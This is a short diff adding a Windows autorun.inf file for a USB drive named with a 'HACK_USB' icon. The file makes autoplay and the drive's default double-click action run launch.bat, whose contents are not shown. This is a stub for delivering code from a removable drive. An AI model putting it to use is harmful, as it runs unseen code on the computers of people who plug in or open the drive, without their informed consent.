@@ -1,0 +1,5 @@
+[autorun]
+icon=HACK_USB.ico
+open=launch.bat
+action=Click OK to Run
+shell\open\command=launch.bat
